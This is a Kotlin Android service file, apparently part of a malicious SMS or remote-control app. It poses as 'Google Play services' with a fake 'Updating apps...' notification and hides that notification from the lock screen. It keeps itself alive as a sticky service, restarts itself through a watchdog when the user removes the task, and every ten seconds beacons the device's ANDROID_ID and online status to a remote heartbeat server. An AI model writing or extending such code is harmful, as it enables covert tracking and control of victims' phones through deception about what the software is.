package com.example.test

import android.app.*
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.test.utils.UnifiedWatchdogScheduler
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class NetworkService : Service() {

    companion object {
        @Volatile var isRunning = false
        
        private const val TAG = "NetworkService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "sms_service_channel"
        private const val CHECK_INTERVAL_MS = 10000L
        
        private const val PREF = "service_alive"
        private const val KEY_LAST_ALIVE = "last_alive_NetworkService"
        
        fun markAlive(ctx: Context) {
            ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
                .edit().putLong(KEY_LAST_ALIVE, SystemClock.elapsedRealtime()).apply()
        }
        
        fun lastAlive(ctx: Context): Long =
            ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).getLong(KEY_LAST_ALIVE, 0L)
    }

    private lateinit var connectivityManager: ConnectivityManager
    private var isCallbackRegistered = false
    private var lastOnlineState: Boolean? = null
    private var cleanupJob: Job? = null
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO + CoroutineExceptionHandler { _, t ->
        Log.e(TAG, "Coroutine error: ${t.message}", t)
    })

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            checkAndUpdateStatus()
        }

        override fun onLost(network: Network) {
            checkAndUpdateStatus()
        }

        override fun onCapabilitiesChanged(network: Network, capabilities: NetworkCapabilities) {
            checkAndUpdateStatus()
        }
    }

    private fun startPeriodicChecker() {
        serviceScope.launch {
            while (isActive) {
                markAlive(applicationContext)
                checkAndUpdateStatus()
                delay(CHECK_INTERVAL_MS)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        startForegroundWithNotification()
        registerNetworkCallback()
        startCleanupLoop()
        startPeriodicChecker()
        checkAndUpdateStatus()
    }
    
    private fun startCleanupLoop() {
        cleanupJob = serviceScope.launch {
            while (isActive) {
                delay(10 * 60 * 1000L) // Every 10 minutes
                val rt = Runtime.getRuntime()
                val usedMB = (rt.totalMemory() - rt.freeMemory()) / 1024 / 1024
                if (usedMB > 120) {
                    runCatching { cacheDir.deleteRecursively() }
                }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) {
            Log.d(TAG, "Already running, skip duplicate start")
            return START_STICKY
        }
        isRunning = true
        
        if (!isCallbackRegistered) {
            registerNetworkCallback()
        }
        checkAndUpdateStatus()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundWithNotification() {
        createNotificationChannel()

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play services")
            .setContentText("Updating apps...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT) // 🔹 not too low
            .setOngoing(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play services",
                NotificationManager.IMPORTANCE_LOW // 🔹 higher than MIN to keep alive
            ).apply {
                description = "Google Play services keeps your apps up to date"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }

            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun registerNetworkCallback() {
        if (isCallbackRegistered) {
            return
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val networkRequest = NetworkRequest.Builder()
                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    .build()

                connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
                isCallbackRegistered = true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register NetworkCallback", e)
        }
    }

    private fun unregisterNetworkCallback() {
        if (!isCallbackRegistered) return

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                connectivityManager.unregisterNetworkCallback(networkCallback)
                isCallbackRegistered = false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister NetworkCallback", e)
        }
    }

    private fun checkAndUpdateStatus() {
        val currentState = isNetworkAvailable()

        if (lastOnlineState == null || lastOnlineState != currentState) {
            lastOnlineState = currentState
            updateOnlineStatus(currentState)
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork ?: return false
                val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false

                val hasInternet = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                val hasTransport = capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)

                hasInternet && hasTransport
            } else {
                @Suppress("DEPRECATION")
                val netInfo = connectivityManager.activeNetworkInfo
                netInfo != null && netInfo.isConnected
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking network", e)
            false
        }
    }

    private fun updateOnlineStatus(isOnline: Boolean) {
        Thread {
            try {
                val deviceId = Settings.Secure.getString(
                    contentResolver,
                    Settings.Secure.ANDROID_ID
                )

                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("isOnline", isOnline)
                    put("timestamp", System.currentTimeMillis())
                    put("source", "NetworkReceiver")
                }

                val baseUrl = ServerConfig.getBaseUrl()
                val url = URL("$baseUrl/devices/heartbeat")
                val conn = url.openConnection() as HttpURLConnection

                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray(Charsets.UTF_8))
                    os.flush()
                }

                conn.responseCode
                conn.disconnect()

            } catch (e: Exception) {
                Log.e(TAG, "Failed to update status", e)
            }
        }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        unregisterNetworkCallback()
        
        serviceScope.launch {
            cleanup()
            UnifiedWatchdogScheduler.kickNow(applicationContext)
        }
    }
    
    override fun onTaskRemoved(rootIntent: Intent?) {
        serviceScope.launch {
            cleanup()
            UnifiedWatchdogScheduler.kickNow(applicationContext)
        }
    }
    
    private suspend fun cleanup() = withContext(Dispatchers.IO) {
        cleanupJob?.cancel()
        serviceScope.coroutineContext.cancelChildren()
        Log.d(TAG, "Service cleaned up")
    }
}